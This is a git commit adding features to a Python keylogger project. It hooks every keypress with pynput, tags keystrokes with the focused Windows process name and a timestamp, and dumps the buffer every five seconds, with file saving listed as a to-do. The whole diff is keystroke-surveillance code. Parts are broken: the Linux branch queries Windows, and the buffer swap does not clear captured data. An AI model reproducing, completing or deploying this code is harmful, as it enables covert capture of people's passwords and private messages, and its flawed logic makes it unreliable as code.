f9eeb17649adc1bfa0135673b5a915d229438c3a
LLighty <liam.hhui@gmail.com>
2021-09-16 20:05:57 +1000

    Updated KeyLogger.py to include:  - Detection of foreground window (What is currently focussed)  - Provide updates on what has been pressed every 5s.
    Todo:
     - Save data to a file instead of to terminal.
     - Allow user to set delay on writing information.
     - Allow user to specify name of file.

--- keylogger/src/KeyLogger.py
+++ keylogger/src/KeyLogger.py
@@ -1,5 +1,10 @@
 import platform
+import win32gui
+import psutil
+import win32process
+import os
 import threading
+import time
 from datetime import datetime
 from pynput import keyboard
 
@@ -10,11 +15,39 @@ class KeyLogger:
         self.start_dt = datetime.now()
         self.filename = filename
         self.listener = None
+        self.current_window = 'placeholder'
+        self.primary_buffer = ''
+        self.secondary_buffer = ''
+        self.current_buffer = self.primary_buffer
+        self.previous_buffer = None
+        self.is_running = True
+        self.update_text_thread = threading.Timer(5, self.update_file_thread)
+        self.update_text_thread.start()
 
     def on_press(self, key):
-        print(key)
+        if self.discovered_os == 'Linux':
+            window_name = get_active_window_name('Windows')
+            self.append_to_buffer(window_name, key)
+        elif self.discovered_os == 'Windows':
+            window_name = get_active_window_name('Windows')
+            self.append_to_buffer(window_name, key)
+
         if key == keyboard.Key.f1:
             self.stop_listening()
+
+    def append_to_buffer(self, window_name, key):
+        print(self.current_window)
+        if self.current_window not in window_name:
+            self.current_window = window_name
+            print(self.current_window + ' ' + window_name + '')
+            now = datetime.now()
+            current_time = now.strftime("%H:%M:%S")
+            self.current_buffer += '\n'
+            self.current_buffer += window_name + ' ' + current_time
+            self.current_buffer += '\n'
+            self.current_buffer += str(key)
+        else:
+            self.current_buffer += str(key)
 
     def start_listening(self):
         self.listener = keyboard.Listener(
@@ -24,15 +57,51 @@ class KeyLogger:
 
     def stop_listening(self):
         self.listener.stop()
+        self.is_running = False
+
+    def update_file_thread(self):
+        self.write_to_file()
+        while self.is_running:
+            time.sleep(5)
+            self.write_to_file()
 
     def write_to_file(self):
-        None
+        # Currently not thread safe
+        print("testing")
+        self.previous_buffer = self.current_buffer
+        self.switch_buffers()
+        # Ensure that the file exists before we append information (If not create it).
+        #if not os.path.isfile():
+        #    file = open(self.filename, 'w')
+        #with open(self.filename, "a") as text_file:
+        #    text_file.write(self.previous_buffer)
+        print(self.previous_buffer)
+        # Clear the buffer for future input
+        self.previous_buffer = ''
+
+    def switch_buffers(self):
+        if self.current_buffer == self.primary_buffer:
+            self.current_buffer = self.secondary_buffer
+        else:
+            self.current_buffer = self.primary_buffer
+
+
+def get_active_window_name(operating_system):
+    if operating_system == 'Linux':
+        # Todo - discover how to capture focussed window on Linux
+        return ''
+    elif operating_system == 'Windows':
+        window = win32gui
+        window.GetWindowText(window.GetForegroundWindow())
+        pid = win32process.GetWindowThreadProcessId(window.GetForegroundWindow())
+        return psutil.Process(pid[-1]).name()
 
 
 def main():
     key_logger = KeyLogger()
     key_logger.start_listening()
-    input()
+    while key_logger.is_running:
+        time.sleep(1)
 
 
 if __name__ == "__main__":
